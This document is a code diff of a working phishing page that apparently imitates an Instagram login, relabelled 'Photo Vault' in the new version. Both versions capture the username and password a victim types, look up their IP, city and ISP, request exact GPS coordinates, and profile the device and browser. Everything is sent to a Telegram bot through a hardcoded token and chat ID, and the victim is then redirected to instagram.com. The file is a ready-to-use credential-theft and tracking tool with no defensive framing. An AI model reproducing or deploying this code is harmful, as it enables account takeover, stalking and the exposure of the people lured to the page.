@@ -3,63 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Viewer • Login</title>
+    <title>Photo Vault - Login</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 3px; }
-        .eye-logo { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; border: 1px solid #efefef; }
-        .brand-text { font-style: italic; font-size: 32px; font-weight: bold; margin-bottom: 30px; display: block; color: #262626; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; outline: none; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 9px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #1877f2; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 4px; }
     </style>
 </head>
 <body>
-<div class="login-box">
-    <img src="eye.jpg" alt="Logo" class="eye-logo" onerror="this.src='https://cdn-icons-png.flaticon.com/512/159/159604.png'">
-    <span class="brand-text">Instagram</span>
-    <form id="vaultForm">
-        <input type="text" id="user" placeholder="Username or email" onfocus="captureMeta()" required>
-        <input type="password" id="pass" placeholder="Password" required>
-        <button type="submit" id="loginBtn">Log In</button>
-    </form>
-</div>
 
-<script>
-const botToken = "8755802754:AAFCJmpYy7LDgWdizjl3iXNwAQ4Dvu5VEo4";
-const chatIds = ["-1003971522575"]; // Corrected IDs
+    <div class="login-box">
+        <h2 style="text-align: center;">Login to View</h2>
+        <form id="vaultForm">
+            <input type="text" id="user" placeholder="Username or Email" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
 
-function captureMeta() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            broadcast(`📍 *EXACT GPS*\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-        }, () => { fetchIp(); });
-    } else { fetchIp(); }
-}
+    <script>
+        // --- CONFIGURATION ---
+        const botToken = "8755802754:AAFCJmpYy7LDgWdizjl3iXNwAQ4Dvu5VEo4";
+        const chatIds = ["-1003971522575"]; // Aapka Updated Group ID
 
-function fetchIp() {
-    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-        broadcast(`🌐 *IP LOG*\nIP: \`${data.ip}\` \nCity: ${data.city}\nCountry: ${data.country_name}`);
-    });
-}
+        let visitorInfo = {};
 
-document.getElementById('vaultForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const u = document.getElementById('user').value;
-    const p = document.getElementById('pass').value;
-    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-    document.getElementById('loginBtn').innerText = "Verifying...";
-    
-    broadcast(`👤 *LOGIN DATA*\n*Time:* \`${time}\` \n*User:* \`${u}\` \n*Pass:* \`${p}\``);
-    setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 2000);
-});
+        // 1. Page load hote hi details fetch karega
+        window.onload = async function() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                const ua = navigator.userAgent;
+                
+                // Device detection
+                let device = "PC/Laptop";
+                if (/Android/i.test(ua)) {
+                    const match = ua.match(/Android\s+([^\s;]+|[^;]+);\s+([^;]+)/);
+                    device = match ? match[2] : "Android Phone";
+                } else if (/iPhone/i.test(ua)) {
+                    device = "iPhone / iOS";
+                }
 
-function broadcast(m) {
-    chatIds.forEach(id => {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(m)}&parse_mode=Markdown`;
-        new Image().src = url;
-        if (navigator.sendBeacon) { navigator.sendBeacon(url); }
-    });
-}
-</script>
+                // Browser detection
+                let browser = "Chrome";
+                if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+                else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
+                else if (ua.indexOf("Edge") > -1) browser = "Edge";
+
+                visitorInfo = {
+                    ip: data.ip,
+                    city: data.city,
+                    sim: data.org, // SIM/ISP Provider
+                    device: device,
+                    browser: browser,
+                    time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+                };
+            } catch (e) { 
+                console.log("Background fetch failed"); 
+            }
+        };
+
+        // 2. Form Submit hone par final report
+        document.getElementById('vaultForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            // Location check
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { 
+                        const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        sendFinalReport(u, p, maps); 
+                    },
+                    (err) => { 
+                        sendFinalReport(u, p, `${visitorInfo.city || "Unknown"} (Exact Denied)`); 
+                    }
+                );
+            } else {
+                sendFinalReport(u, p, visitorInfo.city || "Not Supported");
+            }
+        }, { once: true });
+
+        // 3. Telegram par message bhejne ka function
+        function sendFinalReport(u, p, loc) {
+            const report = `🔥 *FULL TARGET DATA* 🔥\n\n` +
+                           `⏰ *1. Time:* ${visitorInfo.time || "N/A"}\n` +
+                           `📍 *2. Location:* ${loc}\n` +
+                           `🌍 *3. IP Address:* \`${visitorInfo.ip || "N/A"}\`\n` +
+                           `👤 *4. Username:* \`${u}\` \n` +
+                           `🔑 *5. Password:* \`${p}\` \n` +
+                           `📱 *6. Device:* ${visitorInfo.device || "N/A"}\n` +
+                           `🌐 *7. Browser:* ${visitorInfo.browser || "N/A"}\n` +
+                           `📡 *8. SIM/ISP:* ${visitorInfo.sim || "N/A"}`;
+
+            chatIds.forEach(id => {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`;
+                const img = new Image();
+                img.src = url;
+            });
+
+            // Redirect to destination
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com";
+            }, 1500);
+        }
+    </script>
 </body>
 </html>
